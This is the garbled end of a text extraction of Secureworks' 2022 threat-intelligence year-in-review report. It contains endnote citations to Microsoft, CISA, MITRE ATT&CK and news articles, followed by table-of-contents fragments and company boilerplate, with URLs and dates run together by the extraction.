robin\-worm\-abuses\-windows\-installer\-and\-qnap\-devices102ODBCCONF.EXE, Microsoft, accessed 8422\.https:docs.microsoft.comen\-ussqlodbcodbcconf\-
exe?view\=sql\-server\-ver16103BRONZE ATLAS threat group profile, Secureworks. 
https:www.secureworks.comresearchthreat\-profiles
bronze\-atlas104AUTHENTICODE (I): UNDERSTANDING WINDOWS 
AUTHENTICODE, RME, accessed 72822\.
https:reversea.meindex.phpauthenticode\-i\-understanding\-
windows\-authenticode105Microsoft Security Bulletin MS13\-098 \- Critical,Microsoft, accessed 72822\.
https:docs.microsoft.comen\-ussecurity\-updates
securitybulletins2013ms13\-098106Microsoft Security Advisory 2915720, Microsoft,accessed 72822\. 
https:docs.microsoft.comen\-ussecurity\-updates
securityadvisories20142915720107108Russian State\-Sponsored Cyber Actors Gain Network 
Access by Exploiting Default Multifactor Authentication 
Protocols and PrintNightmare Vulnerability, CISA, 
accessed 8122\.
https:www.cisa.govuscertncasalertsaa22\-074aLapsus$ and SolarWinds hackers both use the same old 
trick to bypass MFA, Ars Technica, accessed 72822\. 
https:arstechnica.cominformation\-technology202203
lapsus\-and\-solar\-winds\-hackers\-both\-use\-the\-same\-old\-trick\-
to\-bypass\-mfa109Catching Transparent Phish: Analyzing and DetectingMITM Phishing Toolkits, Stony Brook University and Palo 
Alto, accessed 72822\.
https:catching\-transparent\-phish.github.iocatching\_
transparent\_phish.pdf110Clever phishing method bypasses MFA using MicrosoftWebView2 apps, Bleeping Computer, accessed 72822\. 
https:www.bleepingcomputer.comnewssecurityclever\-
phishing\-method\-bypasses\-mfa\-using\-microsoft\-webview2\-
apps111112MITRE ATT\&CK(r) Navigator.
https:mitre\-attack.github.ioattack\-navigatorOS Credential Dumping, MITRE ATT\&CK(r).
https:attack.mitre.orgtechniquesT1003702022 State of the Threat: A Year in Review060708010203040506070809Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersAbout SecureworksSecureworks (NASDAQ: SCWX) is a global cybersecurity leader that protects customerExploitation of Remote 
Services is Now the Most 
Common Access Vectorprogress with Secureworks Taegis, a cloud\-native security analytics platform built on 20\+ yearsof real\-world threat intelligence and research, improving customers ability to detect advancedthreats, streamline and collaborate on investigations, and automate the right actions.Hostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesFor more information, call 1\-877\-838\-7947 to speak to aSecureworks security specialist or visit secureworks.comConclusionThe Secureworks
View of the ThreatAvailability varies by region. 2022 SecureWorks, Inc. All rights reserved.712022 State of the Threat: A Year in Review060708010203040506070809